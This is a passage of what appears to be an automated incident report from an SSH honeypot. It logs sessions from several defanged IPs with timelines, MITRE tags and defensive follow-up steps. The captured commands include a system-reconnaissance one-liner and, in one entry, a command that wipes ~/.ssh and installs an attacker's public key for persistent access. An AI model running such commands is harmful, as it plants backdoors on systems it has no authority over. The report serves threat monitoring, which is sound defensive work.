| `2026-09-04 04:30:26` | `cowrie.session.connect` |
| `2026-09-04 04:30:26` | `cowrie.client.version` |
| `2026-09-04 04:30:26` | `cowrie.client.kex` |
| `2026-09-04 04:30:27` | `cowrie.login.success` |
| `2026-09-04 04:30:27` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:30:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:30:27` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:30:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c368024b032

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:30 |
| **Last Seen** | 2026-09-04 04:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:30:28` | `cowrie.session.connect` |
| `2026-09-04 04:30:28` | `cowrie.client.version` |
| `2026-09-04 04:30:28` | `cowrie.client.kex` |
| `2026-09-04 04:30:29` | `cowrie.login.success` |
| `2026-09-04 04:30:30` | `cowrie.session.params` |
| `2026-09-04 04:30:30` | `cowrie.command.input` |
| `2026-09-04 04:30:30` | `cowrie.command.input` |
| `2026-09-04 04:30:30` | `cowrie.command.input` |
| `2026-09-04 04:30:30` | `cowrie.command.input` |
| `2026-09-04 04:30:30` | `cowrie.command.input` |
| `2026-09-04 04:30:30` | `cowrie.command.success` |
| `2026-09-04 04:30:30` | `cowrie.command.input` |
| `2026-09-04 04:30:30` | `cowrie.command.input` |
| `2026-09-04 04:30:30` | `cowrie.command.input` |
| `2026-09-04 04:30:30` | `cowrie.command.input` |
| `2026-09-04 04:30:30` | `cowrie.log.closed` |
| `2026-09-04 04:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c79cc4a607e9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:32 |
| **Last Seen** | 2026-09-04 04:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:32:36` | `cowrie.session.connect` |
| `2026-09-04 04:32:37` | `cowrie.client.version` |
| `2026-09-04 04:32:37` | `cowrie.client.kex` |
| `2026-09-04 04:32:38` | `cowrie.login.success` |
| `2026-09-04 04:32:39` | `cowrie.session.params` |
| `2026-09-04 04:32:39` | `cowrie.command.input` |
| `2026-09-04 04:32:39` | `cowrie.command.input` |
| `2026-09-04 04:32:39` | `cowrie.command.input` |
| `2026-09-04 04:32:39` | `cowrie.command.input` |
| `2026-09-04 04:32:39` | `cowrie.command.input` |
| `2026-09-04 04:32:39` | `cowrie.command.success` |
| `2026-09-04 04:32:39` | `cowrie.command.input` |
| `2026-09-04 04:32:39` | `cowrie.command.input` |
| `2026-09-04 04:32:39` | `cowrie.command.input` |
| `2026-09-04 04:32:39` | `cowrie.command.input` |
| `2026-09-04 04:32:40` | `cowrie.log.closed` |
| `2026-09-04 04:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e669a74b5fe

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-04 04:34 |
| **Last Seen** | 2026-09-04 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:34:15` | `cowrie.session.connect` |
| `2026-09-04 04:34:15` | `cowrie.client.version` |
| `2026-09-04 04:34:15` | `cowrie.client.kex` |
| `2026-09-04 04:34:15` | `cowrie.login.success` |
| `2026-09-04 04:34:16` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:34:16` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:34:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-069ec603aa9f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:34 |
| **Last Seen** | 2026-09-04 04:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:34:37` | `cowrie.session.connect` |
| `2026-09-04 04:34:38` | `cowrie.client.version` |
| `2026-09-04 04:34:38` | `cowrie.client.kex` |
| `2026-09-04 04:34:39` | `cowrie.login.success` |
| `2026-09-04 04:34:41` | `cowrie.session.params` |
| `2026-09-04 04:34:41` | `cowrie.command.input` |
| `2026-09-04 04:34:41` | `cowrie.command.input` |
| `2026-09-04 04:34:41` | `cowrie.command.input` |
| `2026-09-04 04:34:41` | `cowrie.command.input` |
| `2026-09-04 04:34:41` | `cowrie.command.input` |
| `2026-09-04 04:34:41` | `cowrie.command.success` |
| `2026-09-04 04:34:41` | `cowrie.command.input` |
| `2026-09-04 04:34:41` | `cowrie.command.input` |
| `2026-09-04 04:34:41` | `cowrie.command.input` |
| `2026-09-04 04:34:41` | `cowrie.command.input` |
| `2026-09-04 04:34:41` | `cowrie.log.closed` |
| `2026-09-04 04:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1d116254d35

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:36 |
| **Last Seen** | 2026-09-04 04:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:36:33` | `cowrie.session.connect` |
| `2026-09-04 04:36:33` | `cowrie.client.version` |
| `2026-09-04 04:36:33` | `cowrie.client.kex` |
| `2026-09-04 04:36:34` | `cowrie.login.success` |
| `2026-09-04 04:36:35` | `cowrie.session.params` |
| `2026-09-04 04:36:35` | `cowrie.command.input` |
| `2026-09-04 04:36:35` | `cowrie.command.input` |
| `2026-09-04 04:36:35` | `cowrie.command.input` |
| `2026-09-04 04:36:35` | `cowrie.command.input` |
| `2026-09-04 04:36:35` | `cowrie.command.input` |
| `2026-09-04 04:36:35` | `cowrie.command.success` |
| `2026-09-04 04:36:35` | `cowrie.command.input` |
| `2026-09-04 04:36:35` | `cowrie.command.input` |
| `2026-09-04 04:36:35` | `cowrie.command.input` |
| `2026-09-04 04:36:35` | `cowrie.command.input` |
| `2026-09-04 04:36:36` | `cowrie.log.closed` |
| `2026-09-04 04:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb296ed55607

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:38 |
| **Last Seen** | 2026-09-04 04:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:38:34` | `cowrie.session.connect` |
| `2026-09-04 04:38:34` | `cowrie.client.version` |
| `2026-09-04 04:38:34` | `cowrie.client.kex` |
| `2026-09-04 04:38:36` | `cowrie.login.success` |
| `2026-09-04 04:38:37` | `cowrie.session.params` |
| `2026-09-04 04:38:37` | `cowrie.command.input` |
| `2026-09-04 04:38:37` | `cowrie.command.input` |
| `2026-09-04 04:38:37` | `cowrie.command.input` |
| `2026-09-04 04:38:37` | `cowrie.command.input` |
| `2026-09-04 04:38:37` | `cowrie.command.input` |
| `2026-09-04 04:38:37` | `cowrie.command.success` |
| `2026-09-04 04:38:37` | `cowrie.command.input` |
| `2026-09-04 04:38:37` | `cowrie.command.input` |
| `2026-09-04 04:38:37` | `cowrie.command.input` |
| `2026-09-04 04:38:37` | `cowrie.command.input` |
| `2026-09-04 04:38:38` | `cowrie.log.closed` |
| `2026-09-04 04:38:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1adff7dfbcc3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:38 |
| **Last Seen** | 2026-09-04 04:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:38:59` | `cowrie.session.connect` |
| `2026-09-04 04:38:59` | `cowrie.client.version` |
| `2026-09-04 04:38:59` | `cowrie.client.kex` |
| `2026-09-04 04:39:00` | `cowrie.login.success` |
| `2026-09-04 04:39:00` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:39:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:39:00` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d88978a1fcf9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:40 |
| **Last Seen** | 2026-09-04 04:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:40:29` | `cowrie.session.connect` |
| `2026-09-04 04:40:29` | `cowrie.client.version` |
| `2026-09-04 04:40:29` | `cowrie.client.kex` |
| `2026-09-04 04:40:30` | `cowrie.login.success` |
| `2026-09-04 04:40:32` | `cowrie.session.params` |
| `2026-09-04 04:40:32` | `cowrie.command.input` |
| `2026-09-04 04:40:32` | `cowrie.command.input` |
| `2026-09-04 04:40:32` | `cowrie.command.input` |
| `2026-09-04 04:40:32` | `cowrie.command.input` |
| `2026-09-04 04:40:32` | `cowrie.command.input` |
| `2026-09-04 04:40:32` | `cowrie.command.success` |
| `2026-09-04 04:40:32` | `cowrie.command.input` |
| `2026-09-04 04:40:32` | `cowrie.command.input` |
| `2026-09-04 04:40:32` | `cowrie.command.input` |
| `2026-09-04 04:40:32` | `cowrie.command.input` |
| `2026-09-04 04:40:32` | `cowrie.log.closed` |
| `2026-09-04 04:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0ecceb92ad3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:41 |
| **Last Seen** | 2026-09-04 04:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:41:16` | `cowrie.session.connect` |
| `2026-09-04 04:41:16` | `cowrie.client.version` |
| `2026-09-04 04:41:16` | `cowrie.client.kex` |
| `2026-09-04 04:41:17` | `cowrie.login.success` |
| `2026-09-04 04:41:17` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:41:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:41:17` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:41:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d4088d95af3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:42 |
| **Last Seen** | 2026-09-04 04:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:42:27` | `cowrie.session.connect` |
| `2026-09-04 04:42:27` | `cowrie.client.version` |
| `2026-09-04 04:42:27` | `cowrie.client.kex` |
| `2026-09-04 04:42:29` | `cowrie.login.success` |
| `2026-09-04 04:42:31` | `cowrie.session.params` |
| `2026-09-04 04:42:31` | `cowrie.command.input` |
| `2026-09-04 04:42:31` | `cowrie.command.input` |
| `2026-09-04 04:42:31` | `cowrie.command.input` |
| `2026-09-04 04:42:31` | `cowrie.command.input` |
| `2026-09-04 04:42:31` | `cowrie.command.input` |
| `2026-09-04 04:42:31` | `cowrie.command.success` |
| `2026-09-04 04:42:31` | `cowrie.command.input` |
| `2026-09-04 04:42:31` | `cowrie.command.input` |
| `2026-09-04 04:42:31` | `cowrie.command.input` |
| `2026-09-04 04:42:31` | `cowrie.command.input` |
| `2026-09-04 04:42:32` | `cowrie.log.closed` |
| `2026-09-04 04:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c323ab8a4257

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:44 |
| **Last Seen** | 2026-09-04 04:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:44:21` | `cowrie.session.connect` |
| `2026-09-04 04:44:22` | `cowrie.client.version` |
| `2026-09-04 04:44:22` | `cowrie.client.kex` |
| `2026-09-04 04:44:23` | `cowrie.login.success` |
| `2026-09-04 04:44:24` | `cowrie.session.params` |
| `2026-09-04 04:44:24` | `cowrie.command.input` |
| `2026-09-04 04:44:24` | `cowrie.command.input` |
| `2026-09-04 04:44:24` | `cowrie.command.input` |
| `2026-09-04 04:44:24` | `cowrie.command.input` |
| `2026-09-04 04:44:24` | `cowrie.command.input` |
| `2026-09-04 04:44:24` | `cowrie.command.success` |
| `2026-09-04 04:44:24` | `cowrie.command.input` |
| `2026-09-04 04:44:24` | `cowrie.command.input` |
| `2026-09-04 04:44:24` | `cowrie.command.input` |
| `2026-09-04 04:44:24` | `cowrie.command.input` |
| `2026-09-04 04:44:24` | `cowrie.log.closed` |
| `2026-09-04 04:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72d0f94fa9ca

| Field | Detail |
|---|---|
| **Source IP** | `152.32.90[.]8` |
| **First Seen** | 2026-09-04 04:44 |
| **Last Seen** | 2026-09-04 04:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:44:54` | `cowrie.session.connect` |
| `2026-09-04 04:44:54` | `cowrie.client.version` |
| `2026-09-04 04:44:54` | `cowrie.client.kex` |
| `2026-09-04 04:44:55` | `cowrie.login.success` |
| `2026-09-04 04:44:56` | `cowrie.session.params` |
| `2026-09-04 04:44:56` | `cowrie.command.input` |
| `2026-09-04 04:44:56` | `cowrie.command.failed` |
| `2026-09-04 04:44:56` | `cowrie.log.closed` |
| `2026-09-04 04:44:57` | `cowrie.session.params` |
| `2026-09-04 04:44:57` | `cowrie.command.input` |
| `2026-09-04 04:44:57` | `cowrie.session.file_download` |
| `2026-09-04 04:44:57` | `cowrie.log.closed` |
| `2026-09-04 04:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.90[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.90[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-273d4167ef27

| Field | Detail |
|---|---|
| **Source IP** | `152.32.90[.]8` |
| **First Seen** | 2026-09-04 04:44 |
| **Last Seen** | 2026-09-04 04:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:44:58` | `cowrie.session.connect` |
| `2026-09-04 04:44:58` | `cowrie.client.version` |
| `2026-09-04 04:44:58` | `cowrie.client.kex` |
| `2026-09-04 04:44:59` | `cowrie.login.success` |
| `2026-09-04 04:44:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.90[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.90[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ad4f87a9e98

| Field | Detail |
|---|---|
| **Source IP** | `152.32.90[.]8` |
| **First Seen** | 2026-09-04 04:44 |
| **Last Seen** | 2026-09-04 04:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:44:59` | `cowrie.session.connect` |
| `2026-09-04 04:44:59` | `cowrie.client.version` |
| `2026-09-04 04:44:59` | `cowrie.client.kex` |
| `2026-09-04 04:45:00` | `cowrie.login.success` |
| `2026-09-04 04:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.90[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.90[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a714533261da

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:46 |
| **Last Seen** | 2026-09-04 04:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
